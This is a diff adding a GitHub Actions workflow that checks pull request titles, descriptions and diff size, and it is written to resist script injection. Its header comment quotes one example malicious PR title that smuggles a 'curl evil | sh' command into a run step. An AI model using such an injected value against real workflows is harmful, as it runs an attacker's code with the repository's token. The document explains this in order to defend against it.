@@ -1,0 +1,90 @@
+# Pull request hygiene: a title that parses, a description that exists, and a
+# diff somebody can actually review.
+#
+# The interesting part of this file is what it does NOT do: it never puts a PR
+# title or body directly into a `run:` block. Both are attacker-controlled on a
+# public repository, and `run: echo "${{ github.event.pull_request.title }}"`
+# with a title of `"; curl evil | sh; "` is a shell running the attacker's code
+# with the workflow's token. Everything untrusted goes through `env:` and is read
+# from the environment, where it is data rather than script.
+
+name: pr hygiene
+
+on:
+  pull_request:
+    types: [opened, edited, synchronize, reopened]
+
+# `pull_request`, not `pull_request_target`. The latter runs in the base repo's
+# context with a writable token and access to secrets, against code the
+# contributor wrote.
+permissions:
+  contents: read
+  pull-requests: write
+
+concurrency:
+  group: pr-hygiene-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  title:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Conventional commit title
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          python - <<'PY'
+          import os, re, sys
+          title = os.environ.get("TITLE", "")
+          pattern = r'^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\([a-z0-9/_-]+\))?!?: .{4,}$'
+          if re.match(pattern, title):
+              print("ok: %s" % title)
+              sys.exit(0)
+          print("Title does not match the conventional commit format.")
+          print("  got:      %s" % title)
+          print("  expected: type(scope): a short description")
+          print("  types:    feat fix docs style refactor perf test build ci chore revert")
+          sys.exit(1)
+          PY
+
+  description:
+    runs-on: ubuntu-latest
+    steps:
+      - name: A description that says something
+        env:
+          BODY: ${{ github.event.pull_request.body }}
+        run: |
+          python - <<'PY'
+          import os, re, sys
+          body = os.environ.get("BODY") or ""
+          # Strip HTML comments so an untouched template counts as empty.
+          stripped = re.sub(r'<!--.*?-->', '', body, flags=re.S).strip()
+          if len(stripped) >= 30:
+              sys.exit(0)
+          print("The pull request description is empty or only the template.")
+          print("Say what changed and why. The diff already says how.")
+          sys.exit(1)
+          PY
+
+  size:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          fetch-depth: 0
+      - name: Warn on a diff nobody will review properly
+        env:
+          BASE: ${{ github.event.pull_request.base.sha }}
+          HEAD: ${{ github.event.pull_request.head.sha }}
+        run: |
+          # Generated files and lockfiles are excluded: a lockfile bump is not a
+          # 4,000-line review, and counting it as one trains people to ignore
+          # this check.
+          CHANGED=$(git diff --numstat "$BASE" "$HEAD" \
+            -- . ':(exclude)**/*.lock' ':(exclude)**/*-lock.json' \
+                 ':(exclude)**/*.snap' ':(exclude)**/dist/**' \
+            | awk '{added+=$1; removed+=$2} END {print added+removed+0}')
+          echo "reviewable lines changed: $CHANGED"
+          if [ "$CHANGED" -gt 800 ]; then
+            echo "::warning::$CHANGED lines changed. Consider splitting this."
+          fi
